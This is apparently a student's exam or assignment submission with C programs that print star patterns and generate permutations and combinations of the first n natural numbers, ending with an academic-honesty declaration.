<h4><div align="left">2. Answer the following Questions. (Any <em><ins>Four</ins></em>). &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4 &times; 5 = 20 </div></h4>

**(a)** Write a C program that prints the following pattern for `2*n+1` lines. Take `n` as input.
```
*       *
 *     *
  *   *
   * *
    *
   * *
  *   *
 *     *
*       *
```

**Answer:**
```c++
#include <stdio.h>

int main()
{
    int n, m;
    scanf("%d" ,&n);
    m=2*n+1;
    for(int i=1; i<=m; i++)
    {
        for(int j=1; j<=m; j++)
        {
            if(i==j || j==(m-i+1))
            {
                printf("*");
            }
            else
            {
                printf(" ");
            }
        }
        printf("\n");
    }
    return 0;
}
```


**(b)** Write a C program that prints the following pattern for `2*n+1` lines. Take `n` as input.    
```
        *
       ***
      *****
     *******
    *********
     *******
      *****
       ***
        *
```

**Answer:**
```c++
#include <stdio.h>
int main()
{
    int n;
    scanf("%d",&n);
    n=2*n+1;
    int spaces=n-1;
    int stars=1;

    for(int i=1; i<=n; i++)
    {
        for(int j=1; j<=spaces; j++)
        {
            printf(" ");
        }
        for(int k=1; k<=stars; k++)
        {
            printf("*");
        }
        if(spaces>i)
        {
            spaces=spaces-1;
            stars=stars+2;
        }
        if(spaces<i)
        {
            spaces=spaces+1;
            stars=stars-2;
        }
        printf("\n");
    }
    return 0;
}
```


**(c)** Write a C program that prints the following pattern for `2*n+1` lines. Take `n` as input.   
```
*
**
***
****
*****
******
*****
****
***
**
*
```

**Answer:**
```c++
#include <stdio.h>

int main()
{
    int n,m=1;
    scanf("%d",&n);
    n++;
    for(int i=1; i<=n; i++)
    {
        for(int j=1; j<=i; j++)
        {
            printf("*");
        }
        printf("\n");
    }
    for(int i=n-1; i>=1; i--)
    {
        for(int j=1; j<=i; j++)
        {
            printf("*");
        }
        printf("\n");
    }

    return 0;
}
```


**(d)** Write a C program that prints the following pattern for `2*n+1` lines. Take `n` as input.    
```
******
 *****
  ****
   ***
    **
     *
    **
   ***
  ****
 *****
******
```

**Answer:**
```c++
#include <stdio.h>

int main()
{

    int n;
    scanf("%d",&n);
    n++;
    for(int i=0; i<n; i++)
    {
        for(int j=0; j<i; j++)
        {
            printf(" ");
        }
        for(int k=1; k<=n-i; k++)
        {
            printf("*");
        }
        printf("\n");
    }
    for(int i=1; i<n; i++)
    {
        for(int j=1; j<n-i; j++)
        {
            printf(" ");
        }
        for(int k=1; k<=i+1; k++)
        {
            printf("*");
        }
        printf("\n");
    }
    return 0;
}
```

<br/><br/>
<h4><div align="left">3. Answer the following Questions. (Any <em><ins>Two</ins></em>). &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 &times; 10 = 20 </div></h4>

**(a)** Write a C program to generate all permutations of first N natural numbers.

**Answer:**

```c++
#include <stdio.h>

int arr[100];

void perm(int pos, int n, long long mask)
{
	if (pos == n)
	{
		for (int i = 0; i < n; i++) printf("%d ", arr[i]);
		printf("\n");
		return;
	}
	for (int i = 0; i < n; i++)
	{
		if (!(mask & (1 << i)))
		{
			arr[pos] = i + 1;
			perm(pos + 1, n, mask | (1 << i));
		}
	}
}

int main()
{
	int n;
	scanf("%d", &n);
	long long mask = 0;
	perm(0, n, mask);

	return 0;
}
```


**(b)** Write a C program that generates all possible **permutations** of exaclty ***r*** numbers choosen from first ***n*** natural numbers. The total number of such permutations is **<sup>n</sup>P<sub>r</sub>**.

**Answer:**
```c++
#include <stdio.h>

int arr[100];

void perm(int pos, int n, int r, long long mask)
{
	if (pos == r)
	{
		for (int i = 0; i < r; i++) printf("%d ", arr[i]);
		printf("\n");
		return;
	}
	for (int i = 0; i < n; i++)
	{
		if (!(mask & (1 << i)))
		{
			arr[pos] = i + 1;
			perm(pos + 1, n, r, mask | (1 << i));
		}
	}
}

int main()
{
	int n,r;
	scanf("%d%d", &n,&r);
	long long mask = 0;
	perm(0, n, r, mask);

	return 0;
}
```

**(c)** Write a C program that generates all possible **combinations** of exaclty ***r*** numbers choosen from first ***n*** natural numbers. The total number of such combinations is **<sup>n</sup>C<sub>r</sub>**.

**Answer:**
```c++
#include <stdio.h>

int arr[100];

void comb(int pos, int n, int r, int last)
{
	if(pos>n) return;
	
	if (pos == r)
	{
		for (int i = 0; i < r; i++) printf("%d ", arr[i]);
		printf("\n");
		return;
	}
	for (int i = last+1; i <= n; i++)
	{
		
		arr[pos] = i;
		comb(pos + 1, n, r, i);
	}
}

int main()
{
	int n,r;
	scanf("%d%d", &n,&r);
	comb(0, n, r, 0);

	return 0;
}
```


<div align="center">- End -</div>

- [x] I am declaring that, the above work is my own work. Whatever added above
except the template is the result of my brainstorming. I also understand that
submitting work that isn’t my own may result in permanent failure of this course
as well as the whole current semester.
